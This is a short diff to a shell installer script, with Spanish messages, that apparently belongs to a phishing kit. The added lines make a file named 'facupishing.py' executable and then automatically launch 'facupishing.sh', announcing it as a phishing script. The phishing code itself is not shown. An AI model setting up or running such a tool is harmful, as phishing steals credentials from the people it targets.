@@ -55,7 +55,15 @@ clear
 cd /home/
 sleep 5
 clear
-printf "\e[1;31m Instalacion finalizada\n"
+printf "\e[1;31m Asignando permisos a archivo pishing...\n"
+sleep 3
+chmod +x facupishing.py
+printf "\e[1;31m Instalacion completada..\n"
+clear
+printf "\e[1;31m Ejecutaremos el script pishing en 3 segundos\n"
+sleep 3
+clear
+bash facupishing.sh
 exit
 
 
